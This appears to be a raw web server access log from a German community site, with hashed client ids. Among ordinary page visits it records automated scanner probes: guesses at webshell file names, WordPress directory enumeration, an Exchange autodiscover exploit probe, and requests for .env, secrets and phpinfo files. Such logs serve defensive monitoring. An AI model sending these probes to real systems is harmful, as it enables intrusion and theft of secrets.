a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:44;;/bge.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:44;;/ifm.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:44;;/ww5.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:44;;/thxt.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:45;;/kairolin.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:45;;/siln.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:45;;/congab.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:45;;/show.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:45;;/ioxi-o1.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:45;;/juuuu.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:45;;/ha.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:45;;/waw.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:45;;/gg.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:45;;/bless2.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:46;;/01.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:46;;/02.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:46;;/03.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:46;;/04.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:46;;/05.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:46;;/error.php;GET;404
a7c5a240e38bbccd2c6f31da0b8cf18ba7b9d8151586b75b01c28d687dcdc5c7;2025-11-24 09:05:46;;/bless3.php;GET;404
f11af4ef3919a799b9a097426e8142d523a1659405af8d030004913170e90046;2025-11-24 09:09:02;;/;GET;200
1643d7f23f01233807cc0fc8eb75eb82fe1c721c2c19d116656a46c0badb111c;2025-11-24 09:13:06;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
55d34873bd1697d1cdcb759f6db294129384ede58eeaeac0852854f72e7d238b;2025-11-24 09:20:53;;/rechtliches/nutzungsbedingungen;GET;200
c6afba7df4d96c57ac250a2c67d12bf117a0cfdc6b546bae8bc575e48b64768e;2025-11-24 09:26:37;;/personen/alumni/schule/65262;GET;200
f084a6a9c9a2c6e6884da83a15f79eedd6350f677885f0e3de189572559e94e3;2025-11-24 09:30:01;;/;GET;200
66ebe0d2d1b7eee4a546502a10f957bfdd5b234791ddf0a07b5b6863ff499ccb;2025-11-24 09:39:44;;/;OPTIONS;405
13e22963ea095ec9efa86fad25db00867e4120ac265b75d3538a64fa83179488;2025-11-24 09:50:34;;/;GET;200
13e22963ea095ec9efa86fad25db00867e4120ac265b75d3538a64fa83179488;2025-11-24 09:50:44;;/wiki;GET;404
020326332b014b5f341c91c2156fa2c56029f4ea4d9bebeeb8f9d4cf510b96fe;2025-11-24 09:57:12;;/;GET;200
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:15;/;/xmrlpc.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:16;/;/abcd.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:16;/;/admin.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:16;/;/info.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:17;/;/edit.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:17;/;/moon.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:18;/;/wp-content/index.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:18;/;/classwithtostring.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:19;/;/file4.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:19;/;/ioxi-o.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:19;/;/wp-good.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:20;/;/ds.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:20;/;/bolt.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:20;/;/new.php;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:20;/;/wp-includes/js/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:21;/;/wp-includes/pomo/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:21;/;/wp-includes/rest-api/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:21;/;/wp-includes/widgets/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:22;/;/wp-admin/css/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:22;/;/wp-admin/images/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:23;/;/wp-admin/maint/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:23;/;/wp-admin/meta/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:23;/;/wp-admin/network/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:24;/;/wp-admin/user/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:24;/;/wp-content/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:25;/;/wp-content/plugins/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:25;/;/wp-content/themes/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:26;/;/wp-admin/includes/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:26;/;/wp-admin/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:27;/;/wp-content/upgrade/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:27;/;/wp-content/uploads/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:27;/;/wp-includes/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:28;/;/wp-includes/css/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:28;/;/wp-includes/ID3/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:29;/;/wp-includes/IXR/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:29;/;/wp-includes/Requests/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:29;/;/wp-includes/SimplePie/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:30;/;/wp-includes/Text/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:30;/;/wp-content/mu-plugins-old/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:30;/;/wp-content/themes/classic/inc/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:31;/;/wp-content/plugins/ninja-forms/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:31;/;/wp-content/mu-plugins/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:31;/;/wp-includes/Text/Diff/Renderer/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:32;/;/wp-includes/blocks/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:32;/;/wp-includes/certificates/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:32;/;/wp-includes/customize/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:33;/;/wp-includes/fonts/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:33;/;/wp-includes/images/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:34;/;/.well-known/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:34;/;/ALFA_DATA/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:34;/;/.well-knownold/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:36;/;/uploads/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:36;/;/upload/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:37;/;/admin/uploads/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:37;/;/Admin/uploads/;GET;404
aeed9091128137f4b721db30e0559520decb8289ad96b942a96c8133eedc7dcd;2025-11-24 10:10:38;;/;GET;200
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:38;/;/admin/;GET;302
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:39;/;/login;GET;200
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:40;/;/images/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:41;/;/assets/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:42;/;/vendor/phpunit/phpunit/src/Util/PHP/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:43;/;/upload/image/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:43;/;/assets/images/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:43;/;/Public/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:44;/;/vendor/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:44;/;/local/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:45;/;/modules/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:45;/;/Site/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:45;/;/system/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:46;/;/template/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:46;/;/shop/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:46;/;/files/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:46;/;/admin/editor/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:47;/;/include/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:48;/;/Assets/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:48;/;/images/stories/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:49;/;/plugins/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:49;/;/php/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:50;/;/wp-includes/assets/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:50;/;/wp-includes/Text/Diff/Engine/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:50;/;/wp-includes/block-patterns/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:51;/;/wp-includes/Text/Diff/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:51;/;/wp-includes/block-supports/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:52;/;/wp-includes/SimplePie/Cache/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:52;/;/wp-includes/SimplePie/Content/Type/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:52;/;/wp-includes/SimplePie/Content/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:53;/;/wp-includes/rest-api/endpoints/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:53;/;/wp-includes/rest-api/fields/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:53;/;/wp-includes/Requests/Cookie/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:54;/;/wp-includes/Requests/Proxy/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:54;/;/wp-includes/Requests/Response/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:54;/;/wp-includes/Requests/Transport/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:55;/;/wp-includes/Requests/Utility/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:55;/;/wp-includes/js/codemirror/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:55;/;/wp-includes/Requests/Exception/HTTP/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:56;/;/wp-includes/js/crop/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:56;/;/wp-includes/images/crystal/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:57;/;/wp-includes/images/media/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:57;/;/wp-includes/images/smilies/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:57;/;/wp-includes/images/wlw/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:58;/;/wp-includes/rest-api/search/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:10:59;/;/wp-includes/Requests/Exception/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:00;/;/wp-includes/Requests/Auth/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:01;/;/wp-includes/sodium_compat/src/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:01;/;/wp-includes/sitemaps/providers/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:01;/;/wp-includes/Text/Diff/Engine/Engine/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:03;/;/wp-includes/html-api/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:03;/;/wp-includes/php-compat/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:04;/;/wp-includes/PHPMailer/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:04;/;/wp-includes/random_compat/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:05;/;/wp-includes/sitemaps/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:05;/;/wp-includes/sodium_compat/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:06;/;/wp-includes/style-engine/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:06;/;/wp-includes/theme-compat/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:06;/;/wp-admin/css/colors/ectoplasm/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:07;/;/wp-admin/css/colors/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:07;/;/admin/images/slider/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:08;/;/admin/fckeditor/editor/filemanager/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:08;/;/sites/default/files/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:08;/;/admin/controller/extension/extension/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:09;/;/modules/mod_simplefileuploadv1.3/elements/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:09;/;/components/;GET;404
c62875329da122c2b9e726855692587911df683c78b64cc4f7d96ec69345f596;2025-11-24 10:11:10;/;/admin/uploads/images/;GET;404
25b2e9a539e75650de289b930c539f25f6bb130d2b8c9d3b39a736576847339f;2025-11-24 10:23:00;;/;GET;200
7386f461fca85cfc37ed17f5d150d2ba8f4a60d92465ebde371b87f82d4104a2;2025-11-24 10:23:18;/;/;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-24 10:28:08;/gruppen/hobby/gartnern;/gruppen/hobby/musikinstrumente-spielen;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-24 10:28:09;/gruppen/hobby/gartnern;/gruppen;GET;200
5a7790fd958f6bd8bfb7ea9097914d4fe9e8039990c304dba873646330cac0b5;2025-11-24 10:36:43;;/personen/alumni/schule/600027;GET;200
aeff1636c01440c2e0e2876c759a8aa731b53b6db9810fe46eb847b487dcd1cd;2025-11-24 10:39:46;;/;GET;200
d84022659f65be93d01f09a8534e7f377bb0f179e5b08de77e2f2dd691931d2b;2025-11-24 10:45:30;;/aktuelles/stellenangebote;GET;200
5bf67f63f36334c776fec032665e0d1ab31a774e5ebef8505415417f416b45df;2025-11-24 10:45:53;;/personen/alumni/schule/600027;GET;200
04dd34aa089fc346aee88c0d38349a2398cf8c96aa432c2470d1079137c55adb;2025-11-24 10:46:16;;/;GET;200
5a61fe69b77e4c8460d6e96c7ae3ee222e2522a221cc40e917449d64d6db9a91;2025-11-24 10:49:58;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-24 10:57:25;/gruppen/hobby/gartnern;/personen/alumni/schule/MP004;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-24 10:58:51;/gruppen/hobby/gartnern;/personen/alumni/schule/04A06;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-24 11:00:12;/gruppen/hobby/gartnern;/gruppen/hobby/fitness;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-24 11:00:12;/gruppen/hobby/gartnern;/gruppen;GET;200
1db4a485b7ef884bf67e0c264ca782666cf4aa2c8def51a763cc2ff27c283a05;2025-11-24 11:08:52;;/;GET;200
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-24 11:11:57;;/app_dev.php/_profiler/phpinfo;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-24 11:11:58;;/?phpinfo=-1;GET;200
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-24 11:11:58;;/?url=.env;GET;200
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-24 11:12:00;;/phpinfo.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-24 11:12:03;;/info/;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-24 11:12:06;;/phpinfo/;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-24 11:12:08;;/.config.yaml;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-24 11:12:08;;/info;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-24 11:12:09;;/secrets.env;GET;404
d8838d442e6bdd098555c75b8b5783a0a017cc69fa32e8a459643c0aec075b12;2025-11-24 11:18:50;;/;GET;200
a454bbb784dcd9caa56e528f3cbb50eaa692729562837235ec069c1870ca4906;2025-11-24 11:20:06;;/themen/details/abschied-aus-moabit;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-24 11:29:37;/gruppen/hobby/gartnern;/personen/alumni/schule/4340014;GET;200
371d50d95ab3492aa1a2b58a1d158fecfa48036d97b8f32624562ee7c0da7ba1;2025-11-24 11:29:47;;/;GET;200
371d50d95ab3492aa1a2b58a1d158fecfa48036d97b8f32624562ee7c0da7ba1;2025-11-24 11:29:48;;/;GET;200
43890574a9acee27bf83953c61466f70f76bbc011ceba8572fe341a5cf1bd207;2025-11-24 11:30:31;;/;GET;200
57ebfd77d82a3dff77af256e28e7db614e4e5bed10023c944b24d9585a957c24;2025-11-24 11:31:36;;/;GET;200
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:38;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:39;;/shoha.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:39;;/yyy.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:40;;/ooj.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:44;;/0.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:45;;/x3.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:45;;/hzz.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:46;;/dom.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:46;;/dds.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:47;;/gg.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:47;;/past.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:47;;/class-db.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:47;;/bq.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:48;;/tro.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:49;;/lov.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:49;;/wsz.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:49;;/73106.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:50;;/nas.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:50;;/acp.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:51;;/aol7.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:51;;/wui.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:52;;/wp-admin/new2.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:52;;/poj.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:53;;/log.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:53;;/zoro.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:54;;/ker.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:54;;/aaa.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:54;;/efa4f.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:55;;/a2.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:55;;/dop.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:56;;/l.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:56;;/sec.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:56;;/set.php;GET;404
6881001ed5df6cefd2c52684d80934bbc650943c4ac0469718c69a50ffd4dc46;2025-11-24 11:37:57;;/pn.php;GET;404
